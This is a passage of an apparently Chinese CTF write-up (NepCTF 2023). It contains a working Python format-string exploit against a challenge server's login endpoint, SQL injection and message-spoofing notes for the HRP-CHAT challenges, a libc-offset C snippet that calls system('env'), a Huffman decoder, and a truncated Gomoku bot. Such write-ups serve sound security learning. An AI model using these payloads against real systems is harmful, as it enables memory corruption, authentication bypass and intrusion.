<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">creat_logger</span>(<span class="params">log_path, logging_name, suf_name</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(log_path):</span><br><span class="line">        os.makedirs(log_path)</span><br><span class="line">    log_full_path = log_path + logging_name + suf_name</span><br><span class="line">    logger = logging.getLogger(logging_name)</span><br><span class="line">    logger.setLevel(level=logging.DEBUG)</span><br><span class="line">    handler = logging.FileHandler(log_full_path, encoding=<span class="string">&#x27;UTF-8&#x27;</span>, mode=<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    handler.setLevel(logging.INFO)</span><br><span class="line">    formatter = logging.Formatter(<span class="string">&#x27;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">    handler.setFormatter(formatter)</span><br><span class="line">    console = logging.StreamHandler()</span><br><span class="line">    console.setLevel(logging.DEBUG)</span><br><span class="line">    logger.addHandler(handler)</span><br><span class="line">    logger.addHandler(console)</span><br><span class="line">    <span class="keyword">return</span> logger</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">logger = creat_logger(<span class="string">&quot;./&quot;</span>, <span class="string">&quot;log&quot;</span>, <span class="string">&quot;.txt&quot;</span>)</span><br><span class="line">req = requests.session()</span><br><span class="line">start = <span class="string">b&quot;deadbeaf&quot;</span></span><br><span class="line">end = <span class="string">b&quot;asdewedv&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://106.75.63.100:34617&quot;</span></span><br><span class="line"><span class="comment"># url = &quot;http://172.20.192.1:8080&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_s</span>(<span class="params">offset</span>):</span><br><span class="line">    <span class="keyword">if</span> offset &lt; <span class="number">0</span>:</span><br><span class="line">        offset += <span class="number">2</span> ** <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = req.get(url + <span class="string">&quot;/login&quot;</span>, params=&#123;</span><br><span class="line">                <span class="string">&quot;user&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;start.decode()&#125;</span>%<span class="subst">&#123;offset&#125;</span>$s<span class="subst">&#123;end.decode()&#125;</span>&quot;</span>,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: <span class="string">&quot;aaaa&quot;</span></span><br><span class="line">            &#125;, timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> ConnectionResetError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;retrying...&quot;</span>, e)</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">except</span> TimeoutError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;retrying...&quot;</span>, e)</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ConnectTimeout <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;retrying...&quot;</span>, e)</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    s = r.content</span><br><span class="line">    <span class="comment"># print(s)</span></span><br><span class="line">    code = s[s.find(start) + <span class="built_in">len</span>(start):s.find(end)]</span><br><span class="line">    <span class="keyword">return</span> code, <span class="built_in">hex</span>(struct.unpack(<span class="string">&quot;&lt;Q&quot;</span>, code[:<span class="number">8</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\00&quot;</span>))[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_p</span>(<span class="params">offset</span>):</span><br><span class="line">    <span class="keyword">if</span> offset &lt; <span class="number">0</span>:</span><br><span class="line">        offset += <span class="number">2</span> ** <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = req.get(url + <span class="string">&quot;/login&quot;</span>, params=&#123;</span><br><span class="line">                <span class="string">&quot;user&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;start.decode()&#125;</span>%<span class="subst">&#123;offset&#125;</span>$p<span class="subst">&#123;end.decode()&#125;</span>&quot;</span>,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: <span class="string">&quot;aaaa&quot;</span></span><br><span class="line">            &#125;, timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> ConnectionResetError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;retrying...&quot;</span>, e)</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">except</span> TimeoutError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;retrying...&quot;</span>, e)</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ConnectTimeout <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;retrying...&quot;</span>, e)</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    s = r.content</span><br><span class="line">    code = s[s.find(start) + <span class="built_in">len</span>(start):s.find(end)]</span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">offset, x</span>):</span><br><span class="line">    <span class="keyword">if</span> offset &lt; <span class="number">0</span>:</span><br><span class="line">        offset += <span class="number">2</span> ** <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = req.get(url + <span class="string">&quot;/login&quot;</span>, params=&#123;</span><br><span class="line">                <span class="string">&quot;user&quot;</span>: <span class="string">f&quot;%1000$<span class="subst">&#123;x&#125;</span>c%<span class="subst">&#123;offset&#125;</span>$hhn&quot;</span>,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: <span class="string">&quot;aaaa&quot;</span></span><br><span class="line">            &#125;, timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> ConnectionResetError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;retrying...&quot;</span>, e)</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">except</span> TimeoutError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;retrying...&quot;</span>, e)</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ConnectTimeout <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;retrying...&quot;</span>, e)</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = 15196</span></span><br><span class="line"><span class="comment"># write(p, 0x58)</span></span><br><span class="line"><span class="comment"># print(f&quot;[+] &#123;get_p(p)&#125; =&gt; &#123;read_s(p)&#125;&quot;)</span></span><br><span class="line"><span class="comment"># p2 = 15513</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_s</span>(<span class="params">sx</span>):</span><br><span class="line">    s = struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, sx).strip(<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        p = <span class="number">15196</span></span><br><span class="line">        write(p, <span class="number">0x78</span> + i)</span><br><span class="line">        <span class="comment"># print(f&quot;[+] &#123;get_p(p)&#125; =&gt; &#123;read_s(p)&#125;&quot;)</span></span><br><span class="line">        p2 = <span class="number">15511</span></span><br><span class="line">        write(p2, s[i])</span><br><span class="line">        <span class="comment"># print(f&quot;[+] &#123;get_p(p2)&#125; =&gt; &#123;read_s(p2)&#125;&quot;)</span></span><br><span class="line">        p3 = <span class="number">15518</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;get_p(p3)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(f&quot;[+] &#123;get_p(15712)&#125;&quot;)</span></span><br><span class="line"><span class="comment"># # xt = int(get_p(15712).decode(), 16)</span></span><br><span class="line"><span class="comment"># # print(f&quot;[+] &#123;xt:#x&#125;&quot;)</span></span><br><span class="line"><span class="comment"># print(f&quot;[+] &#123;get_p(15512)&#125;&quot;)</span></span><br><span class="line"><span class="comment"># print(f&quot;[+] &#123;get_p(16110)&#125;&quot;)</span></span><br><span class="line"><span class="comment"># # print(f&quot;[+] &#123;get_p(15712)&#125; =&gt; &#123;read_s(15712)&#125;&quot;)</span></span><br><span class="line"><span class="comment"># for i in range(1, 0x31, 8):</span></span><br><span class="line"><span class="comment"># x = xt + i</span></span><br><span class="line"><span class="comment"># print(f&quot;[+] &#123;x:#x&#125;&quot;)</span></span><br><span class="line">heap_base = <span class="built_in">int</span>(get_p(<span class="number">15059</span>).decode(), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[-&gt;] <span class="subst">&#123;heap_base:#x&#125;</span>&quot;</span>)</span><br><span class="line">xt = heap_base- <span class="number">0x40</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[-&gt;] <span class="subst">&#123;xt:#x&#125;</span>&quot;</span>)</span><br><span class="line">write_s(xt)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] done&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(read_s(<span class="number">15518</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># write_s(0xdeadbeafdeadbeaf)</span></span><br><span class="line"><span class="comment"># p = 15196</span></span><br><span class="line"><span class="comment"># print(f&quot;[+] &#123;get_p(p)&#125; =&gt; &#123;read_s(p)&#125;&quot;)</span></span><br><span class="line"><span class="comment"># p = 15513</span></span><br><span class="line"><span class="comment"># print(f&quot;[+] &#123;get_p(p)&#125; =&gt; &#123;read_s(p)&#125;&quot;)</span></span><br><span class="line"><span class="comment"># p = 15516</span></span><br><span class="line"><span class="comment"># print(f&quot;[+] &#123;get_p(p)&#125;&quot;)</span></span><br><span class="line"><span class="comment"># for i in range(0x3d5b-10, 0x3d5b+100):</span></span><br><span class="line"><span class="comment">#     code = get_p(i)</span></span><br><span class="line"><span class="comment">#     if code.startswith(b&quot;0x55&quot;) or code.startswith(b&quot;0x7f&quot;) and len(code):</span></span><br><span class="line"><span class="comment">#         content = read_s(i)</span></span><br><span class="line"><span class="comment">#         # print(f&quot;[+] &#123;i&#125; =&gt; &#123;code&#125; =&gt; &#123;content&#125;&quot;)</span></span><br><span class="line"><span class="comment">#         logger.warning(f&quot;[+] &#123;i&#125; =&gt; &#123;code&#125; =&gt; &#123;content&#125;&quot;)</span></span><br><span class="line"><span class="comment">#         continue</span></span><br><span class="line"><span class="comment">#     # print(f&quot;[+] &#123;i&#125; =&gt; &#123;code&#125;&quot;)</span></span><br><span class="line"><span class="comment">#     logger.info(f&quot;[+] &#123;i&#125; =&gt; &#123;code&#125;&quot;)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="HRP-CHAT"><a href="#HRP-CHAT" class="headerlink" title="HRP-CHAT"></a>HRP-CHAT</h2><p>这一套题都是源码审计的题目，漏洞也很简单</p>
<h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>SQL注入，注意这里不能用万能密码1’ or 1&#x3D;1–因为在client中scanf不支持空格，所以就要先在数据库中注册一个用户名为1的用户，然后再次注册一个用户名为<code>1&#39;--</code></p>
<p><img src="/p/2023NepCTF/image-20230814094413198.png" alt="image-20230814094413198"></p>
<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>首先分析源码（其实也不用chat的sever，只要看client的处理逻辑即可）可以看到这里Bot模式只会返回一个字符串<code>&#39;远程AI协助服务正在开发中!&#39;</code>，但是我们需要服务器返回<code>RemoteVIPApplicationCertificationHasPassed</code>这一串才能获得flag，那么我们就需要伪造服务器返回的message。我们可以看Chat模式下的服务器的原理，服务器就是转发消息进行广播。那么我们就可以想到</p>
<p><img src="/p/2023NepCTF/image-20230814094950217.png" alt="image-20230814094950217"></p>
<p>如果让一台机器在Bot模式下，另一台机器在Chat模式下</p>
<p><img src="/p/2023NepCTF/image-20230814095426656.png" alt="image-20230814095426656"></p>
<p>那么我们就可以利用广播的机制，伪造服务器返回message，这里也没有做任何校验，所以就能得到flag</p>
<p><img src="/p/2023NepCTF/b9d03732b675ba6d6a492b90d01f9db.png" alt="b9d03732b675ba6d6a492b90d01f9db"></p>
<h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>3号题目我看不太出来有啥漏洞，感觉就是正常的逻辑，抽卡获取角色，用message查看当前角色池子和技能，抽到H3h3QAQ就可以了，释放第二个技能log4j，就能打死ThTsOd了</p>
<p><img src="/p/2023NepCTF/6a5cba2c75f12515107d0ae7af099ac.png" alt="6a5cba2c75f12515107d0ae7af099ac"></p>
<h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>这个比较玄学，在我打2号flag的时候，可能是2号flag需要卡一个时机，我就写了脚本爆破，可能请求太多了，服务器就崩溃了，进入Safe box的cmd界面，输入Safe_Mode_Key就可以获得flag</p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="codes"><a href="#codes" class="headerlink" title="codes"></a>codes</h2><p>pwn的思路打，先泄露libc，找到偏移直接system(“env”)一把梭</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1234&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> tmp = &amp;<span class="built_in">printf</span>;</span><br><span class="line">tmp -= <span class="number">0x61c90</span>;</span><br><span class="line">tmp += <span class="number">0x52290</span>;</span><br><span class="line">((<span class="type">int</span> (*)(<span class="type">const</span> <span class="type">char</span> *, ...))tmp)(<span class="string">&quot;en&quot;</span> <span class="string">&quot;v&quot;</span>);</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure>

<h2 id="与AI共舞的哈夫曼"><a href="#与AI共舞的哈夫曼" class="headerlink" title="与AI共舞的哈夫曼"></a>与AI共舞的哈夫曼</h2><p>确实不用自己写代码，GPT一把梭</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decompress</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="comment"># Read frequency information</span></span><br><span class="line">        num_freq = <span class="built_in">ord</span>(f.read(<span class="number">1</span>))</span><br><span class="line">        frequencies = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num_freq):</span><br><span class="line">            byte, freq = f.read(<span class="number">1</span>)[<span class="number">0</span>], <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                freq = (freq &lt;&lt; <span class="number">8</span>) | f.read(<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">            frequencies[byte] = freq</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Rebuild Huffman tree</span></span><br><span class="line">        root = build_huffman_tree(frequencies)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Decode compressed data</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> out_f:</span><br><span class="line">            node = root</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                bit = f.read(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                bit = <span class="built_in">int</span>.from_bytes(bit, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">                    <span class="keyword">if</span> (bit &gt;&gt; i) &amp; <span class="number">1</span>:</span><br><span class="line">                        node = node.right</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        node = node.left</span><br><span class="line">                    <span class="keyword">if</span> node.char <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                        out_f.write(<span class="built_in">bytes</span>([node.char]))</span><br><span class="line">                        node = root</span><br></pre></td></tr></table></figure>

<h2 id="ConnectedFive"><a href="#ConnectedFive" class="headerlink" title="ConnectedFive"></a>ConnectedFive</h2><p>万宁五子棋，注意下棋到同一个位置会死机所以要，写逻辑爆破，为了提高胜率，这里采用最朴素的策略，计算每一个空白位置自己的棋子的密度，来判断哪些位置更优</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.timeout = <span class="number">3</span></span><br><span class="line">getIO = <span class="keyword">lambda</span>: remote(<span class="string">&quot;nepctf.1cepeak.cn&quot;</span>, <span class="number">30582</span>)</span><br><span class="line">io = getIO()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getinfo</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;MESSAGE computer: &quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">    scoreboard = io.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>).decode()</span><br><span class="line">    <span class="comment"># print(f&quot;[+] Scoreboard &#123;scoreboard&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># io.recvuntil(b&quot;\t   a b c d e f g h i j k l m n o\n&quot;)</span></span><br><span class="line">    checkerboard = []</span><br><span class="line">    raw = io.recvuntil(<span class="string">b&quot;\t   a b c d e f g h i j k l m n o\n&quot;</span>).decode()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        <span class="comment"># io.recvuntil(b&quot;\t&quot; + bytearray([i+ord(&#x27;a&#x27;)]))</span></span><br><span class="line">        r = io.recvuntil(<span class="string">b&quot;\n&quot;</span>).decode()</span><br><span class="line">        raw += r</span><br><span class="line">        a = r.strip()</span><br><span class="line">        checkerboard.append(a[<span class="number">3</span>::<span class="number">2</span>])</span><br><span class="line">    <span class="comment"># print(checkerboard)</span></span><br><span class="line">    <span class="keyword">return</span> scoreboard, checkerboard, raw</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;abcdefghijklmno&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_pos</span>(<span class="params">x, y, checkerboard: []</span>):</span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">max</span>(<span class="number">0</span>, x-<span class="number">4</span>), <span class="built_in">min</span>(<span class="number">14</span>, x+<span class="number">4</span>)+<span class="number">1</span>):</span><br><span class="line">        cnt += checkerboard[i][y] == <span class="string">&#x27;X&#x27;</span></span><br><span class="line">    res = <span class="built_in">max</span>(res, cnt)</span><br><span class="line"></span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">max</span>(<span class="number">0</span>, y - <span class="number">4</span>), <span class="built_in">min</span>(<span class="number">14</span>, y + <span class="number">4</span>)+<span class="number">1</span>):</span><br><span class="line">        cnt += checkerboard[x][i] == <span class="string">&#x27;X&#x27;</span></span><br><span class="line">    res = <span class="built_in">max</span>(res, cnt)</span><br><span class="line"></span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">4</span>, <span class="number">4</span>+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt;= x + i &lt;= <span class="number">14</span> <span class="keyword">and</span> <span class="number">0</span> &lt;= y + i &lt;= <span class="number">14</span>:</span><br><span class="line">            cnt += checkerboard[x+i][y+i] == <span class="string">&#x27;X&#x27;</span></span><br><span class="line">    res = <span class="built_in">max</span>(res, cnt)</span><br><span class="line"></span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">4</span>, <span class="number">4</span>+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt;= x - i &lt;= <span class="number">14</span> <span class="keyword">and</span> <span class="number">0</span> &lt;= y + i &lt;= <span class="number">14</span>:</span><br><span class="line">            cnt += checkerboard[x-i][y+i] == <span class="string">&#x27;X&#x27;</span></span><br><span class="line">    res = <span class="built_in">max</span>(res, cnt)</span><br><span 